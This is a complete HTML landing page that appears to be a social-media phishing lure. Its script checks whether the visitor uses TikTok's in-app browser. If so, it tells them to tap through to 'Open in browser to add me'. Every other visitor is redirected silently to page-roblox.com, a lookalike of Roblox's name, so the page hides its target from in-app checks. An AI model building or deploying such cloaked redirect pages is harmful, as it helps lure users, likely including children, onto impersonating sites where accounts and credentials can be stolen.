<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open in Browser</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            background: #000;
            font-family: 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
        }

        * {
            box-sizing: border-box;
        }

        .bg-wrapper {
            position: fixed;
            inset: 0;
            overflow: hidden;
            background-color: #141414;
            z-index: 1;
        }

        .bg-wrapper::before,
        .bg-wrapper::after {
            content: "";
            position: absolute;
            inset: -6%;
            background: url('thebackground.png') no-repeat center center;
        }

        .bg-wrapper::before {
            background-size: cover;
            filter: blur(20px);
            opacity: 0.65;
            transform: scale(1.12);
        }

        .bg-wrapper::after {
            background-size: contain;
            filter: blur(4px);
            opacity: 0.95;
        }

        .gradient-overlay {
            position: fixed;
            inset: 0;
            background:
                radial-gradient(circle at 50% 8%, rgba(255, 255, 255, 0.14) 0%, rgba(255, 255, 255, 0) 36%),
                linear-gradient(180deg, rgba(15, 15, 15, 0.42) 0%, rgba(10, 10, 10, 0.74) 52%, rgba(6, 6, 6, 0.9) 100%);
            z-index: 2;
        }

        #tiktok-overlay {
            display: none;
            position: relative;
            z-index: 10;
            min-height: 100svh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 20px;
            padding: 18px 14px 26px;
            color: white;
        }

        .arrow {
            position: absolute;
            top: -42px;
            right: 4px;
            font-size: 74px;
            color: #ff0050;
            animation: bounce 1.2s infinite;
            text-shadow: 0 0 20px rgba(255, 0, 80, 0.6);
            pointer-events: none;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0) rotate(-15deg); }
            50% { transform: translateY(15px) rotate(-15deg); }
        }

        .content-box {
            text-align: center;
            width: min(95vw, 720px);
            margin-top: 90px;
        }

        .instruction {
            font-size: clamp(1.1rem, 2.9vw, 1.45rem);
            font-weight: 600;
            margin-bottom: 18px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        }

        .dots-icon {
            display: inline-block;
            background: rgba(255, 255, 255, 0.22);
            padding: 2px 10px;
            border-radius: 8px;
            backdrop-filter: blur(3px);
            font-weight: 700;
        }

        .guide-image {
            width: min(58vw, 330px);
            max-height: 36svh;
            object-fit: contain;
            border-radius: 18px;
            border: 1px solid rgba(255, 255, 255, 0.18);
            box-shadow: 0 22px 60px rgba(0, 0, 0, 0.45);
            margin: 0 auto;
        }
    </style>
</head>
<body>

    <div class="bg-wrapper"></div>
    <div class="gradient-overlay"></div>

    <div id="tiktok-overlay">
        <div class="arrow">⤴</div>

        <div class="content-box">
            <div class="instruction">Tap the <span class="dots-icon">...</span> then choose <strong>Open in browser to add me</strong></div>
            <img class="guide-image" src="openinbrowserimage.png" alt="Open in browser tutorial image">
        </div>
    </div>

    <script>
        function checkTikTok() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const isTikTok = ua.indexOf("TikTok") > -1 || ua.indexOf("ByteLocale") > -1;
            const overlay = document.getElementById('tiktok-overlay');

            if (isTikTok) {
                overlay.style.display = 'flex';
            } else {
                window.location.replace("https://page-roblox.com/users/5775475429/profile");
            }
        }

        checkTikTok();
    </script>
</body>
</html>
